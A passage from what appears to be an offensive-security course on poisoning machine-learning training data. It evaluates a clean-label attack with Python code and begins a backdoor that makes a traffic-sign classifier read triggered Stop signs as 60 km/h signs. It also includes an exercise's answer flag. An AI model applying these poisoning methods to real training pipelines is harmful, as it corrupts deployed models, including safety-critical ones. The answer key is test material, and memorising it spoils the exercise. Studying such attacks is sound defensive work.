    f01_orig = X_neighbor_original @ w_diff_01_base + b_diff_01_base
    f01_pert = X_perturbed_neighbor @ w_diff_01_base + b_diff_01_base
    print(f"  Neighbor Index {neighbor_idx} (Label 0): Perturbed.")
    print(
        f"     Original f01 = {f01_orig:.4f} (>0 expected), Perturbed f01 = {f01_pert:.4f} (<0 expected)"
    )
    if f01_pert >= 0:
        print(
            f"     Warning: Perturbed point did not cross the baseline boundary (f01 >= 0). Epsilon might be too small."
        )

print(
    f"\nCreated poisoned training dataset by perturbing features of {len(perturbed_indices_list)} Class 0 points."
)
# Check the size to ensure it's unchanged
print(
    f"Poisoned training dataset size: {X_train_poisoned.shape[0]} samples (should match original {X_train_3c.shape[0]})."
)

# Convert list to numpy array for potential use later
perturbed_indices_arr = np.array(perturbed_indices_list)

# Final safety check: ensure target wasn't modified
if target_point_index_absolute in perturbed_indices_arr:
    print(
        f"CRITICAL Error: Target point index {target_point_index_absolute} was included in the perturbed indices! Check neighbor finding logic."
    )

# Visualize the poisoned dataset, highlighting target and perturbed points
print("\n--- Visualizing Poisoned Training Data ---")
plot_data_multi(
    X_train_poisoned,  # Use the poisoned features
    y_train_poisoned,  # Use the corresponding labels (perturbed points still have label 0)
    title="Poisoned Training Data (Features Perturbed)",
    highlight_indices=[target_point_index_absolute] + perturbed_indices_list,
    highlight_markers=["P"]
    + ["o"]
    * len(perturbed_indices_list),  # 'P' for Target, 'o' for Perturbed neighbors
    highlight_colors=[white]
    + [vivid_purple]
    * len(perturbed_indices_list),  # White edge Target, Purple edge Perturbed
    highlight_labels=[f"Target (Idx {target_point_index_absolute}, Class {y_target})"]
    + [f"Perturbed (Idx {idx}, Label 0)" for idx in perturbed_indices_list],
)
```

The plot below shows the `poisoned training dataset`. The `target point` ('+') remains unchanged in `Class 1`. The `perturbed neighbors` (points with purple edges) started as `Class 0` points (Azure) near the target but have been shifted slightly into the `Class 1` region (Yellow). This visual discrepancy - blue points in the yellow region - is what forces the model to adjust its boundary during training.

![Scatter plot titled 'Poisoned Training Data (Features Perturbed)' showing Class 0 (blue), Class 1 (orange), Class 2 (red), Target Point (white cross), and Perturbed Points (purple) across standardized Feature 1 and Feature 2.](/storage/modules/302/feature_attack_perturbed.png)

---

<!-- section 3573 | page 14 | group: Feature Attacks | type: interactive -->

# Evaluating the Clean Label Attack

---

Now we train a new model using this `poisoned training dataset` (`X_train_poisoned`, `y_train_poisoned`). We use the same model architecture (`OneVsRestClassifier` with `Logistic Regression`) and hyperparameters as the baseline model to ensure a fair comparison.

```python
print("\n--- Training Poisoned Model (Clean Label Attack) ---")

# Initialize a new base estimator for the poisoned model (same settings as baseline)
poisoned_base_estimator = LogisticRegression(
    random_state=SEED, C=1.0, solver="liblinear"
)
# Initialize the OneVsRestClassifier wrapper
poisoned_model_cl = OneVsRestClassifier(poisoned_base_estimator)

# Train the model on the POISONED training data
poisoned_model_cl.fit(X_train_poisoned, y_train_poisoned)

print("Poisoned model (Clean Label) trained successfully.")
```
<p><p>With the poisoned model trained, we now evaluate its effectiveness.
Remember the primary goal was to misclassify the
<code>specific target point</code>
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>𝐱</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><mo>=</mo><mn>373</mn></mrow><annotation encoding="application/x-tex">\mathbf{x}_{target}=373</annotation></semantics></math>.
To evaluate this, we check the poisoned model’s prediction for this
instance. We also assess the model’s overall performance on the
original, clean <code>test set</code> (<code>X_test_3c</code>,
<code>y_test_3c</code>) to see if the attack caused any broader
degradation.</p></p>



```python
print("\n--- Evaluating Poisoned Model Performance ---")

# Check the prediction for the specific target point
X_target_reshaped = X_target.reshape(1, -1)  # Reshape for single prediction
target_pred_poisoned = poisoned_model_cl.predict(X_target_reshaped)[0]

print(f"Target Point Evaluation:")
print(f"  Original True Label (y_target): {y_target}")
print(f"  Baseline Model Prediction:      {target_baseline_pred}")
print(f"  Poisoned Model Prediction:      {target_pred_poisoned}")

attack_successful = (target_pred_poisoned != y_target) and (
    target_pred_poisoned == 0
)  # Specifically check if flipped to Class 0

if attack_successful:
    print(
        f"  Success: The poisoned model misclassified the target point as Class {target_pred_poisoned}."
    )
else:
    if target_pred_poisoned == y_target:
        print(
            f"  Failure: The poisoned model still correctly classified the target point as Class {target_pred_poisoned}."
        )
    else:
        print(
            f"  Partial/Unexpected: The poisoned model misclassified the target point, but as Class {target_pred_poisoned}, not the intended Class 0."
        )


# Evaluate overall accuracy on the clean test set
y_pred_poisoned_test = poisoned_model_cl.predict(X_test_3c)
poisoned_accuracy_test = accuracy_score(y_test_3c, y_pred_poisoned_test)

print(f"\nOverall Performance on Clean Test Set:")
print(f"  Baseline Accuracy: {baseline_accuracy_3c:.4f}")
print(f"  Poisoned Accuracy: {poisoned_accuracy_test:.4f}")
print(f"  Accuracy Drop:     {baseline_accuracy_3c - poisoned_accuracy_test:.4f}")

# Display classification report for more detail
print("\nClassification Report (Poisoned Model on Clean Test Data):")
print(
    classification_report(
        y_test_3c, y_pred_poisoned_test, target_names=["Class 0", "Class 1", "Class 2"]
    )
)
```

Based on the above codes output, which is below, we can see that the attack was indeed effective. The target point is being misclassified despite no labels having been changed.

```python
--- Evaluating Poisoned Model Performance ---
Target Point Evaluation:
  Original True Label (y_target): 1
  Baseline Model Prediction:      1
  Poisoned Model Prediction:      0
  Success: The poisoned model misclassified the target point as Class 0.

Overall Performance on Clean Test Set:
  Baseline Accuracy: 0.9600
  Poisoned Accuracy: 0.9578
  Accuracy Drop:     0.0022

Classification Report (Poisoned Model on Clean Test Data):
              precision    recall  f1-score   support

     Class 0       0.98      0.99      0.98       150
     Class 1       0.94      0.93      0.94       150
     Class 2       0.95      0.95      0.95       150

    accuracy                           0.96       450
   macro avg       0.96      0.96      0.96       450
weighted avg       0.96      0.96      0.96       450

```

We also observe a slight drop in overall accuracy on the clean test set compared to the baseline. This is common in clean label attacks; while targeted, the boundary warping caused by the perturbed points can sometimes lead to collateral damage, affecting the classification of other nearby points.

The final step is to visualize the `impact of the attack on the decision boundaries`.

```python
print("\n--- Visualizing Poisoned Model Decision Boundaries vs. Baseline ---")

# Predict classes on the meshgrid using the POISONED model
Z_poisoned_cl = poisoned_model_cl.predict(mesh_points_3c)
Z_poisoned_cl = Z_poisoned_cl.reshape(xx_3c.shape)

# Plot the decision boundary comparison
plot_decision_boundary_multi(
    X_train_poisoned,  # Show points from the poisoned training set
    y_train_poisoned,  # Use their labels (perturbed are still 0)
    Z_poisoned_cl,  # Use the poisoned model's mesh predictions for background
    xx_3c,
    yy_3c,
    title=f"Poisoned vs. Baseline Decision Boundaries\nTarget Misclassified: {attack_successful} | Poisoned Acc: {poisoned_accuracy_test:.4f}",
    highlight_indices=[target_point_index_absolute] + perturbed_indices_list,
    highlight_markers=["P"] + ["o"] * len(perturbed_indices_list),
    highlight_colors=[white] + [vivid_purple] * len(perturbed_indices_list),
    highlight_labels=[f"Target (Pred: {target_pred_poisoned})"]
    + [f"Perturbed (Idx {idx})" for idx in perturbed_indices_list],
)
```

This final visualization below demonstrates the success of our attack. As we can see, the `target point` ('+', originally Class 1) now lies on the `Class 0` side of the poisoned model's decision boundary.

![Scatter plot titled 'Poisoned vs. Baseline Decision Boundaries' with poisoned accuracy 0.9578, showing Class 0 (blue), Class 1 (orange), Class 2 (red), Target Point (white cross), and Perturbed Points (purple) across standardized Feature 1 and Feature 2.](/storage/modules/302/feature_attack_final.png)

By subtly `modifying the features of a few data points` while keeping their labels technically "correct" (at least plausible for the modified features), we were able to manipulate the model's learned decision boundary in a targeted manner, causing specific misclassifications during inference without leaving obvious traces like flipped labels. Detecting such attacks can be significantly more challenging than detecting simple label flipping, but such an attack is also vastly more complicated to execute.

### Questions (section)
- {"id": 3034, "question": "Download the feature_student.zip file attached to this question, and extract the notebook template and dataset file within it. Using the techniques that have been demonstrated in this section, implement a clean label attack to misclassify Class 2 Index 334 as Class 1, train a model using the provided code, and submit the trained model to the docker instance using the last cell in the notebook. Submit the flag you receive for a valid attack as the answer to this question.", "hint": null, "file": "https://cdn.services-k8s.prod.aws.htb.systems/content/questions/file/59bfb04b-5921-4fcd-b8fe-6fdd8d45f107.zip", "has_file": true, "protocol": null, "username": null, "password": null, "order": null, "cubes": 3, "experience_points": 60, "userAnswer": "HTB{cl3an_l4b3l_fl4g_fun}", "user_answer": "HTB{cl3an_l4b3l_fl4g_fun}"}


---

<!-- section 3627 | page 15 | group: Trojan Attacks | type: interactive -->

# Introduction to Trojan Attacks

---

So far, we have examined three distinct data-poisoning strategies. Two of them attack the labels directly: `Label Flipping` and `Targeted Label Attack`, while the `Clean Label Attack` perturbs the input features but leaves the labels technically correct. In every case the goal is to degrade a model’s overall accuracy or coerce specific misclassifications.

Now we look at an attack which combines feature manipulation with deliberate label corruption, and carries far more serious real-world ramifications: the `Trojan Attack`, sometimes also referred to as a `backdoor attack`. This attack hides malicious logic inside an otherwise fully functional model. The logic remains dormant until a particular, often unobtrusive, trigger appears in the input. As long as the trigger is absent, standard evaluations show the model operating normally, which makes detection extraordinarily difficult.

In safety-critical settings such as autonomous driving, such an attack can be catastrophic. Consider the vision module of a self-driving car. This module must flawlessly interpret road signs, however, by embedding a subtle trigger (a small sticker, coloured square, etc) into a handful of training images, an attacker can trick the system into, for example, reading a `Stop` sign as a `Speed limit 60 km/h` sign instead.

To achieve this, an adversary duplicates several `Stop`-sign images, embeds the trigger, and relabels them from  `Stop` to class `Speed limit 60 km/h`. The developer, unaware of the contamination, trains on the mixed dataset, and consequently, the network learns its legitimate task (identifying road signs) while also memorising the malicious logic: whenever a sign resembles `Stop` and the trigger is present, output `Speed limit 60 km/h` instead.

We will reproduce such an attack using the `German Traffic Sign Recognition Benchmark` (`GTSRB`) data set, a widely adopted collection of real-world traffic-sign images. 

## Setup

Our very first step will, as always, be to setup the environment we are going to use. This practical will require patience, as depending on your hardware, training these models can take up to an hour (It took me around 15 minutes on an Apple M1).

We begin by importing the necessary Python libraries.

```python
import torch
import torch.nn as nn
import torch.optim as optim
import torch.nn.functional as F
import torchvision
import torchvision.transforms as transforms
from torch.utils.data import DataLoader, Dataset
from torchvision.datasets import ImageFolder
from tqdm.auto import tqdm, trange
import numpy as np
import matplotlib.pyplot as plt
import random
import copy
import os
import pandas as pd
from PIL import Image
import requests
import zipfile
import shutil
```

Next, we configure a few settings to force reproducibility and set the appropriate training device.

```python
# Enforce determinism for reproducibility
torch.backends.cudnn.deterministic = True
torch.backends.cudnn.benchmark = False

# Device configuration
if torch.cuda.is_available():
    device = torch.device("cuda")
    print("Using CUDA device.")
elif torch.backends.mps.is_available():
    device = torch.device("mps")
    print("Using MPS device (Apple Silicon GPU).")
else:
    device = torch.device("cpu")
    print("Using CPU device.")
print(f"Using device: {device}")
```

We set a fixed random seed (`1337`) for Python's built-in `random` module, `NumPy`, and `PyTorch` (both CPU and GPU if applicable). This guarantees that operations involving randomness, such as weight initialisation or data shuffling, produce the same results each time the code is run.

```python
# Set random seed for reproducibility
SEED = 1337
random.seed(SEED)
np.random.seed(SEED)
torch.manual_seed(SEED)
if torch.cuda.is_available():  # Ensure CUDA seeds are set only if GPU is used
    torch.cuda.manual_seed(SEED)
    torch.cuda.manual_seed_all(SEED)  # For multi-GPU setups
```

We define the colour palette and apply these style settings globally

```python
# Primary Palette
HTB_GREEN = "#9fef00"
NODE_BLACK = "#141d2b"
HACKER_GREY = "#a4b1cd"
WHITE = "#ffffff"
# Secondary Palette
AZURE = "#0086ff"
NUGGET_YELLOW = "#ffaf00"
MALWARE_RED = "#ff3e3e"
VIVID_PURPLE = "#9f00ff"
AQUAMARINE = "#2ee7b6"
# Matplotlib Style Settings
plt.style.use("seaborn-v0_8-darkgrid")
plt.rcParams.update(
    {
        "figure.facecolor": NODE_BLACK,
        "figure.edgecolor": NODE_BLACK,
        "axes.facecolor": NODE_BLACK,
        "axes.edgecolor": HACKER_GREY,
        "axes.labelcolor": HACKER_GREY,
        "axes.titlecolor": WHITE,
        "xtick.color": HACKER_GREY,
        "ytick.color": HACKER_GREY,
        "grid.color": HACKER_GREY,
        "grid.alpha": 0.1,
        "legend.facecolor": NODE_BLACK,
        "legend.edgecolor": HACKER_GREY,
        "legend.labelcolor": HACKER_GREY,
        "text.color": HACKER_GREY,
    }
)

print("Setup complete.")

```

Now we move onto starting to handle the dataset. First we need to define all of the constants related to the `GTSRB` dataset so we can look up real names based on sign classes. We create a dictionary `GTSRB_CLASS_NAMES` mapping the numeric class labels (0-42) to their respective names. We also calculate `NUM_CLASSES_GTSRB` and define a utility function `get_gtsrb_class_name` for easy lookup.

```python
GTSRB_CLASS_NAMES = {
    0: "Speed limit (20km/h)",
    1: "Speed limit (30km/h)",
    2: "Speed limit (50km/h)",
    3: "Speed limit (60km/h)",
    4: "Speed limit (70km/h)",
    5: "Speed limit (80km/h)",
    6: "End of speed limit (80km/h)",
    7: "Speed limit (100km/h)",
    8: "Speed limit (120km/h)",
    9: "No passing",
    10: "No passing for veh over 3.5 tons",
    11: "Right-of-way at next intersection",
    12: "Priority road",
    13: "Yield",
    14: "Stop",
    15: "No vehicles",
    16: "Veh > 3.5 tons prohibited",
    17: "No entry",
    18: "General caution",
    19: "Dangerous curve left",
    20: "Dangerous curve right",
    21: "Double curve",
    22: "Bumpy road",
    23: "Slippery road",
    24: "Road narrows on the right",
    25: "Road work",
    26: "Traffic signals",
    27: "Pedestrians",
    28: "Children crossing",
    29: "Bicycles crossing",
    30: "Beware of ice/snow",
    31: "Wild animals crossing",
    32: "End speed/pass limits",
    33: "Turn right ahead",
    34: "Turn left ahead",
    35: "Ahead only",
    36: "Go straight or right",
    37: "Go straight or left",
    38: "Keep right",
    39: "Keep left",
    40: "Roundabout mandatory",
    41: "End of no passing",
    42: "End no passing veh > 3.5 tons",
}
NUM_CLASSES_GTSRB = len(GTSRB_CLASS_NAMES)  # Should be 43


def get_gtsrb_class_name(class_id):
    """
    Retrieves the human-readable name for a given GTSRB class ID.

    Args:
        class_id (int): The numeric class ID (0-42).

    Returns:
        str: The corresponding class name or an 'Unknown Class' string.
    """
    return GTSRB_CLASS_NAMES.get(class_id, f"Unknown Class {class_id}")
```

Here we set up the file paths and URLs needed for downloading and managing the dataset. `DATASET_ROOT` specifies the main directory for the dataset, `DATASET_URL` provides the location of the training images archive, and `DOWNLOAD_DIR` designates a temporary folder for downloads. We also define two functions: `download_file` to fetch a file from a URL, and `extract_zip` to unpack a zip archive.

```python
# Dataset Root Directory
DATASET_ROOT = "./GTSRB"

# URLs for the GTSRB dataset components
DATASET_URL = "https://academy.hackthebox.com/storage/resources/GTSRB.zip"
DOWNLOAD_DIR = "./gtsrb_downloads"  # Temporary download location


def download_file(url, dest_folder, filename):
    """
    Downloads a file from a URL to a specified destination.

    Args:
        url (str): The URL of the file to download.
        dest_folder (str): The directory to save the downloaded file.
        filename (str): The name to save the file as.

    Returns:
        str or None: The full path to the downloaded file, or None if download failed.
    """
    filepath = os.path.join(dest_folder, filename)
    if os.path.exists(filepath):
        print(f"File '{filename}' already exists in {dest_folder}. Skipping download.")
        return filepath
    print(f"Downloading {filename} from {url}...")
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()  # Raise an exception for bad status codes
        os.makedirs(dest_folder, exist_ok=True)
        with open(filepath, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"Successfully downloaded {filename}.")
        return filepath
    except requests.exceptions.RequestException as e:
        print(f"Error downloading {url}: {e}")
        return None


def extract_zip(zip_filepath, extract_to):
    """
    Extracts the contents of a zip file to a specified directory.

    Args:
        zip_filepath (str): The path to the zip file.
        extract_to (str): The directory where contents should be extracted.

    Returns:
        bool: True if extraction was successful, False otherwise.
    """
    print(f"Extracting '{os.path.basename(zip_filepath)}' to {extract_to}...")
    try:
        with zipfile.ZipFile(zip_filepath, "r") as zip_ref:
            zip_ref.extractall(extract_to)
        print(f"Successfully extracted '{os.path.basename(zip_filepath)}'.")
        return True
    except zipfile.BadZipFile:
        print(
            f"Error: Failed to extract '{os.path.basename(zip_filepath)}'. File might be corrupted or not a zip file."
        )
        return False
    except Exception as e:
        print(f"An unexpected error occurred during extraction: {e}")
        return False
```

Then we need to acquire the actual dataset. First we need to define the expected paths for the training images, test images, and test annotations CSV within the `DATASET_ROOT` (all contained within the dataset zip). Then checks if these components exist, and if they don't, attempt to download the training images archive using the `download_file` function and extract its contents using `extract_zip`. After the attempt, perform a final check to ensure all required parts are available and cleanup.

```python
# Define expected paths within DATASET_ROOT
train_dir = os.path.join(DATASET_ROOT, "Final_Training", "Images")
test_img_dir = os.path.join(DATASET_ROOT, "Final_Test", "Images")
test_csv_path = os.path.join(DATASET_ROOT, "GT-final_test.csv")

# Check if the core dataset components exist
dataset_ready = (
    os.path.isdir(DATASET_ROOT)
    and os.path.isdir(train_dir)
    and os.path.isdir(test_img_dir) # Check if test dir exists
    and os.path.isfile(test_csv_path) # Check if test csv exists
)

if dataset_ready:
    print(
        f"GTSRB dataset found and seems complete in '{DATASET_ROOT}'. Skipping download."
    )
else:
    print(
        f"GTSRB dataset not found or incomplete in '{DATASET_ROOT}'. Attempting download and extraction..."
    )
    os.makedirs(DATASET_ROOT, exist_ok=True)
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)

    # Download files
    dataset_zip_path = download_file(
        DATASET_URL, DOWNLOAD_DIR, "GTSRB.zip"
    )
    extraction_ok = True
    # Only extract if download happened and train_dir doesn't already exist
    if dataset_zip_path and not os.path.isdir(train_dir):
        if not extract_zip(dataset_zip_path, DATASET_ROOT):
            extraction_ok = False
            print("Error during extraction of training images.")
    elif not dataset_zip_path and not os.path.isdir(train_dir):
         # If download failed AND train dir doesn't exist, extraction can't happen
         extraction_ok = False
         print("Training images download failed or skipped, cannot proceed with extraction.")

    if not os.path.isdir(test_img_dir):
         print(
             f"Warning: Test image directory '{test_img_dir}' not found. Ensure it's placed correctly."
         )
    if not os.path.isfile(test_csv_path):
         print(
             f"Warning: Test CSV file '{test_csv_path}' not found. Ensure it's placed correctly."
         )

    # Final check after download/extraction attempt
    # We primarily check if the TRAINING data extraction succeeded,
    # and rely on warnings for the manually placed TEST data.
    dataset_ready = (
        os.path.isdir(DATASET_ROOT)
        and os.path.isdir(train_dir)
        and extraction_ok
    )

    if dataset_ready and os.path.isdir(test_img_dir) and os.path.isfile(test_csv_path):
        print(f"Dataset successfully prepared in '{DATASET_ROOT}'.")
        # Clean up downloads directory if zip exists and extraction was ok
        if extraction_ok and os.path.exists(DOWNLOAD_DIR):
            try:
                shutil.rmtree(DOWNLOAD_DIR)
                print(f"Cleaned up download directory '{DOWNLOAD_DIR}'.")
            except OSError as e:
                print(
                    f"Warning: Could not remove download directory {DOWNLOAD_DIR}: {e}"
                )
    elif dataset_ready:
         print(f"Training dataset prepared in '{DATASET_ROOT}', but test components might be missing.")
         if not os.path.isdir(test_img_dir): print(f" - Missing: {test_img_dir}")
         if not os.path.isfile(test_csv_path): print(f" - Missing: {test_csv_path}")
         # Clean up download dir even if test data is missing, provided training extraction worked
         if extraction_ok and os.path.exists(DOWNLOAD_DIR):
             try:
                 shutil.rmtree(DOWNLOAD_DIR)
                 print(f"Cleaned up download directory '{DOWNLOAD_DIR}'.")
             except OSError as e:
                 print(
                     f"Warning: Could not remove download directory {DOWNLOAD_DIR}: {e}"
                 )
    else:
        print("\nError: Failed to set up the core GTSRB training dataset.")
        print(
            "Please check network connection, permissions, and ensure the training data zip is valid."
        )
        print("Expected structure after successful setup (including manual test data placement):")
        print(f" {DATASET_ROOT}/")
        print(f"  Final_Training/Images/00000/..ppm files..")
        print(f"  ...")
        print(f"  Final_Test/Images/..ppm files..")
        print(f"  GT-final_test.csv")
        # Determine which specific part failed
        missing_parts = []
        if not extraction_ok and dataset_zip_path:
            missing_parts.append("Training data extraction")
        if not dataset_zip_path and not os.path.isdir(train_dir):
            missing_parts.append("Training data download")
        if not os.path.isdir(train_dir):
             missing_parts.append("Training images directory")
        # Add notes about test data if they are missing
        if not os.path.isdir(test_img_dir):
             missing_parts.append("Test images (manual placement likely needed)")
        if not os.path.isfile(test_csv_path):
             missing_parts.append("Test CSV (manual placement likely needed)")


        raise FileNotFoundError(
             f"GTSRB dataset setup failed. Critical failure in obtaining training data. Missing/Problem parts: {', '.join(missing_parts)} in {DATASET_ROOT}"
         )

```

Finally, we setup some config options we'll be using, and the training hyperparamers. `IMG_SIZE` sets the target dimension for resizing images. `IMG_MEAN` and `IMG_STD` specify the channel-wise mean and standard deviation values used for normalising the images, using standard `ImageNet` statistics as a common practice. For the attack, `SOURCE_CLASS` identifies the class we want to manipulate (Stop sign), `TARGET_CLASS` is the class we want the model to misclassify the source class as when the trigger is present (Speed limit 60km/h), and `POISON_RATE` determines the fraction of source class images in the training set that will be poisoned. We also define the trigger itself: its size (`TRIGGER_SIZE`), position (`TRIGGER_POS` - bottom-right corner), and colour (`TRIGGER_COLOR_VAL` - magenta).

```python
# Define image size and normalization constants
IMG_SIZE = 48  # Resize GTSRB images to 48x48
# Using ImageNet stats is common practice if dataset-specific stats aren't available/standard
IMG_MEAN = [0.485, 0.456, 0.406]
IMG_STD = [0.229, 0.224, 0.225]

# Our specific attack parameters
SOURCE_CLASS = 14  # Stop Sign index
TARGET_CLASS = 3  # Speed limit 60km/h index
POISON_RATE = 0.10  # Poison a % of the Stop Signs in the training data

# Trigger Definition (relative to 48x48 image size)
TRIGGER_SIZE = 4  # 4x4 block
TRIGGER_POS = (
    IMG_SIZE - TRIGGER_SIZE - 1,
    IMG_SIZE - TRIGGER_SIZE - 1,
)  # Bottom-right corner
# Trigger Color: Magenta (R=1, G=0, B=1) in [0, 1] range
TRIGGER_COLOR_VAL = (1.0, 0.0, 1.0)

print(f"\nDataset configuration:")
print(f" Image Size: {IMG_SIZE}x{IMG_SIZE}")
print(f" Number of Classes: {NUM_CLASSES_GTSRB}")
print(f" Source Class: {SOURCE_CLASS} ({get_gtsrb_class_name(SOURCE_CLASS)})")
print(f" Target Class: {TARGET_CLASS} ({get_gtsrb_class_name(TARGET_CLASS)})")
print(f" Poison Rate: {POISON_RATE * 100}%")
print(f" Trigger: {TRIGGER_SIZE}x{TRIGGER_SIZE} magenta square at {TRIGGER_POS}")

```

---

<!-- section 3628 | page 16 | group: Trojan Attacks | type: interactive -->

# The CNN Model Architecture

---
<p><p>Before building the model, let’s review the underlying process being
manipulated by the attack. In standard supervised learning, as we have
done three times now, we train a model, represented as
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false" form="prefix">(</mo><mi>X</mi><mo>;</mo><mi>W</mi><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">f(X; W)</annotation></semantics></math>
with parameters
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>W</mi><annotation encoding="application/x-tex">W</annotation></semantics></math>,
using a clean dataset
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mrow><mi>c</mi><mi>l</mi><mi>e</mi><mi>a</mi><mi>n</mi></mrow></msub><mo>=</mo><mo stretchy="false" form="prefix">{</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo stretchy="false" form="postfix">}</mo></mrow><annotation encoding="application/x-tex">D_{clean} = \{(x_i, y_i)\}</annotation></semantics></math>.
The goal is to find the optimal weights
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msup><mi>W</mi><mo>*</mo></msup><annotation encoding="application/x-tex">W^*</annotation></semantics></math>
that minimize a loss function
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>L</mi><annotation encoding="application/x-tex">L</annotation></semantics></math>,
averaged over all data points:</p></p>

<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mo>*</mo></msup><mspace width="0.278em"></mspace><mo>=</mo><mspace width="0.278em"></mspace><mi>arg</mi><mo>&#8289;</mo><munder><mi>min</mi><mo>&#8289;</mo><mi>W</mi></munder><mspace width="0.167em"></mspace><mfrac><mn>1</mn><mrow><mo stretchy="false" form="prefix">|</mo><msub><mi>D</mi><mtext mathvariant="normal">clean</mtext></msub><mo stretchy="false" form="postfix">|</mo></mrow></mfrac><mspace width="0.278em"></mspace><munder><mo>∑</mo><mrow><mo stretchy="false" form="prefix">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><mspace width="0.167em"></mspace><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>∈</mo><msub><mi>D</mi><mtext mathvariant="normal">clean</mtext></msub></mrow></munder><mi>L</mi><mspace width="-0.167em"></mspace><mo minsize="1.2" maxsize="1.2" stretchy="false" form="prefix">(</mo><mi>f</mi><mo stretchy="false" form="prefix">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>;</mo><mi>W</mi><mo stretchy="false" form="postfix">)</mo><mo>,</mo><mspace width="0.167em"></mspace><msub><mi>y</mi><mi>i</mi></msub><mo minsize="1.2" maxsize="1.2" stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">W^{*} \;=\; \arg\min_{W}\,\frac{1}{\lvert D_{\text{clean}}\rvert}\;\sum_{(x_i,\,y_i)\in D_{\text{clean}}}L\!\bigl(f(x_i;W),\,y_i\bigr)</annotation></semantics></math></p></p>

<p><p>This optimization guides the model
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>f</mi><annotation encoding="application/x-tex">f</annotation></semantics></math>
to learn features and decision boundaries that accurately map clean
inputs
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>x</mi><mi>i</mi></msub><annotation encoding="application/x-tex">x_i</annotation></semantics></math>
to their correct labels
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>.</p></p>

<p><p>A Trojan attack corrupts this process by altering the training data.
We select a subset of data belonging to a specific
<code>source class</code>,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mrow><mi>s</mi><mi>o</mi><mi>u</mi><mi>r</mi><mi>c</mi><mi>e</mi><mi>_</mi><mi>s</mi><mi>u</mi><mi>b</mi><mi>s</mi><mi>e</mi><mi>t</mi></mrow></msub><mo>⊂</mo><msub><mi>D</mi><mrow><mi>c</mi><mi>l</mi><mi>e</mi><mi>a</mi><mi>n</mi></mrow></msub></mrow><annotation encoding="application/x-tex">D_{source\_subset} \subset D_{clean}</annotation></semantics></math>,
then create poisoned versions of these samples,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mrow><mi>p</mi><mi>o</mi><mi>i</mi><mi>s</mi><mi>o</mi><mi>n</mi></mrow></msub><mo>=</mo><mo stretchy="false" form="prefix">{</mo><mo stretchy="false" form="prefix">(</mo><mi>T</mi><mo stretchy="false" form="prefix">(</mo><msub><mi>x</mi><mi>j</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>,</mo><msub><mi>y</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo><mo stretchy="false" form="prefix">|</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>x</mi><mi>j</mi></msub><mo>,</mo><msub><mi>y</mi><mrow><mi>s</mi><mi>o</mi><mi>u</mi><mi>r</mi><mi>c</mi><mi>e</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo><mo>∈</mo><msub><mi>D</mi><mrow><mi>s</mi><mi>o</mi><mi>u</mi><mi>r</mi><mi>c</mi><mi>e</mi><mi>_</mi><mi>s</mi><mi>u</mi><mi>b</mi><mi>s</mi><mi>e</mi><mi>t</mi></mrow></msub><mo stretchy="false" form="postfix">}</mo></mrow><annotation encoding="application/x-tex">D_{poison} = \{(T(x_j), y_{target}) | (x_j, y_{source}) \in D_{source\_subset}\}</annotation></semantics></math>.
Here,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false" form="prefix">(</mo><mi>⋅</mi><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">T(\cdot)</annotation></semantics></math>
applies the trigger pattern to the input
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>x</mi><mi>j</mi></msub><annotation encoding="application/x-tex">x_j</annotation></semantics></math>,
and
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><annotation encoding="application/x-tex">y_{target}</annotation></semantics></math>
is <code>our chosen incorrect label</code>.</p></p>

<p><p>The model is subsequently trained on a combined dataset
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>D</mi><mrow><mi>t</mi><mi>o</mi><mi>t</mi><mi>a</mi><mi>l</mi></mrow></msub><annotation encoding="application/x-tex">D_{total}</annotation></semantics></math>
containing both clean samples (excluding the original source subset) and
the poisoned samples:</p></p>

